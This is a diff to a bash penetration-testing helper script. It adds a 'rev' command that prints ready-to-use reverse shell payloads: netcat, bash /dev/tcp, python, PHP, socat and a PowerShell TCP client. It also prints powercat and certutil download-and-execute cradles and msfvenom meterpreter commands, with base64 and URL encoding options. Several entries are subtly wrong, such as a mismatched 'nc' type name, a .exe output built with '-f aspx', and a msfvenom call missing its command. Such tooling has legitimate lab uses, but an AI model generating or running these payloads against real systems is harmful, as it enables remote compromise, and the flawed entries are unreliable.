@@ -48,11 +48,12 @@ Usage:
   scope <ip/range>                        Append to scope.txt
   note <text>                             Append timestamped line to notes.md
   tmux                                    Launch pre-configured tmux layout
-  cap                                     Save visible pane to logs/
-  hist                                    Save full scrollback to logs/
+  cap                                     Save visible pane to logs/term/
+  hist                                    Save full scrollback to logs/term/
   scan [--udp] <ip> [name]                Deep nmap + smart follow-ups
   sync <ip>                               Sync time to DC, otherwise set-ntp true
   rdp <ip> <user> <pass>                  Quick xfreerdp with dynamic res
+  rev <type> [lhost] <port>               Generate reverse shell / payload string
 
 Options:
   --force      Reuse existing directory
@@ -435,7 +436,7 @@ scan_target() {
   # NFS Check
   if [[ ",$ports," == *",2049,"* ]]; then
       msg_ok "NFS detected!"
-      # Showmount -e is the bread and butter for finding exposed backups/configs
+      # Showmount -e for finding exposed backups/configs
       showmount -e "$ip" | tee "$log_dir/nfs_shares.txt"
   fi
 
@@ -498,6 +499,168 @@ scan_target() {
   # tmux select-layout -t "$target_win" tiled
 }
 
+# ---- Reverse Shell & Payload Generator ----
+
+generate_payload() {
+  local type="${1:-}"
+  local encoder="omz_urlencode"
+  shift || true
+
+
+  # If type is 'list' or empty, show help
+  if [[ -z "$type" || "$type" == "list" || "$type" == "-h" || "$type" == "--help" ]]; then
+    cat <<EOF
+Payload Generator Usage:
+  annexes.sh rev <type> [lhost] <lport> [--b64|--url]
+
+If [lhost] is omitted, it automatically falls back to your active VPN IP ($(get_vpn_ip)).
+
+Modifiers (append at the end):
+  --b64             Encode payload for Windows PowerShell (-enc / UTF-16LE)
+  --url             URL encode the payload (python)
+
+Available Types:
+  #### Linux ####
+  nc                 netcat traditional (mkfifo)
+  nc-openbsd         netcat with -e flag
+  bash               bash TCP interactive
+  sh                 sh TCP interactive
+  socat              socat TCP full tty 
+  python             python3 one-liner
+  php-exec           PHP fsockopen + exec
+  php-proc           PHP proc_open variant
+  msf-lin            msfvenom x64 shell_reverse_tcp (ELF)
+  msf-met-lin        msfvenom x64 meterpreter stageless (ELF)
+
+  #### Windows ####
+  powercat           powercat.ps1 remote script injection (IEX)
+  cmd                cmd reverse shell download + exec
+  ps-tcp             powershell reverse shell one-liner by Nikhil
+  msf-win            msfvenom x64 shell_reverse_tcp (EXE)
+  msf-met-win        msfvenom x64 meterpreter stageless (EXE)
+    
+  #### Web ####
+  bash-web           bash TCP interactive
+  socat-web          socat full tty
+  msf-aspx           msfvenom Windows x64 meterpreter aspx
+  msf-php            msfvenom PHP meterpreter raw
+  msf-jsp            msfvenom Java meterpreter raw
+EOF
+    return 0
+  fi
+
+  local lhost="" lport=""
+  local encode_b64=0 encode_url=0
+
+  # Parse arguments dynamically to handle [lhost]
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      --b64) encode_b64=1; shift ;;
+      --url) encode_url=1; shift ;;
+      *)
+        if [[ -z "$lhost" && "$1" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
+          lhost="$1"
+        elif [[ -z "$lport" && "$1" =~ ^[0-9]+$ ]]; then
+          if [[ -z "$lhost" ]]; then
+            lhost=$(get_vpn_ip)
+            lport="$1"
+          else
+            lport="$1"
+          fi
+        else
+          # Fallback check if it's just a port passed first
+          lport="$1"
+        fi
+        shift
+        ;;
+    esac
+  done
+
+  # Fallback LHOST if only port was provided
+  [[ -z "$lhost" ]] && lhost=$(get_vpn_ip)
+  [[ -z "$lport" ]] && { msg_err "Port required. Usage: rev <type> [lhost] <lport>"; exit 1; }
+
+  local payload=""
+  case "$type" in
+    nc-trad)
+      echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
+      ;;
+    nc-openbsd)
+      echo "nc -e /bin/sh $lhost $lport"
+      ;;
+    bash)
+      payload="Shell: bash -i >& /dev/tcp/$lhost/$lport 0>&1"
+      ;;
+    bash-web)  
+      payload="bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1';"
+      ;;
+    sh)
+      payload="/bin/sh -i < /dev/tcp/$lhost/$lport > 0>&1 2>&1"
+      ;;
+    python)
+      payload="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+      ;;
+    php-exec)
+      payload="php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+      ;;
+    php-proc)
+      payload="php -r '\$s=fsockopen(\"$lhost\",$lport);\$p=proc_open(\"/bin/sh\",array(0=>\$s,1=>\$s,2=>\$s),\$pipes);'"
+      ;;
+    msf-lin)
+      payload="msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o shell.elf"
+      ;;
+    msf-met-lin)
+      payload="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o met.elf"
+      ;;
+    msf-win)
+      payload="msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell.exe"
+      ;;
+    msf-met-win)
+      payload="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f aspx -o met.exe"
+      ;;
+    socat)
+      echo -e "Listener:\nsocat file:`tty`,raw,echo=0 tcp-listen:$lport\n\nPayload:"
+      payload="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport"
+      ;;
+    socat-web)
+      echo -e "Listener:\nsocat file:`tty`,raw,echo=0 tcp-listen:$lport\n\nPayload:"
+      payload="socat tcp-connect:$lhost:$lport exec:bash,pty,stderr,setsid,sigint"
+      ;;
+    msf-php)
+      payload="msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > shell.php"
+      ;;
+    msf-aspx)
+      payload="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f aspx -o shell.aspx"
+      ;;
+    msf-jsp)
+      payload="java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o shell.jsp"
+      ;;
+    powercat)
+      payload="powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost:$DEFAULT_HTTP_PORT/powercat.ps1');powercat -c $lhost -p $lport -e cmd\""
+      ;;
+    cmd)
+      echo -e "Generate Shell:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o rev.exe\n\nPayload:"
+      payload="certutil.exe -f -urlcache -split http://$lhost:$DEFAULT_HTTP_PORT/rev.exe c:\windows\temp\rev.exe && cmd.exe /c c:\windows\temp\rev.exe"
+      ;;
+    ps-tcp)
+      payload="powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""      ;;
+    *)
+      msg_err "Unknown payload type: $type. Run 'rev list' for options."
+      exit 1
+      ;;
+  esac
+
+  # Apply Encoding Modifiers if requested
+  if (( encode_b64 )); then
+    payload=$(echo -n "$payload" | iconv -t UTF-16LE | base64 | tr -d '\n')
+    payload="powershell -enc $payload"
+  elif (( encode_url )); then
+    payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
+  fi
+
+  echo "$payload"
+}
+
 # ---- Dispatcher ----
 
 main() {
@@ -523,6 +686,7 @@ main() {
     rdp)      quick_rdp     "$@" ;;
     scan)     scan_target "$@" ;;
     sync)     sync_time "$@" ;;
+    rev)      generate_payload "$@" ;;
     -h|--help|"") usage ;;
     *) msg_err "Unknown command: $cmd"; usage; exit 1 ;;
   esac
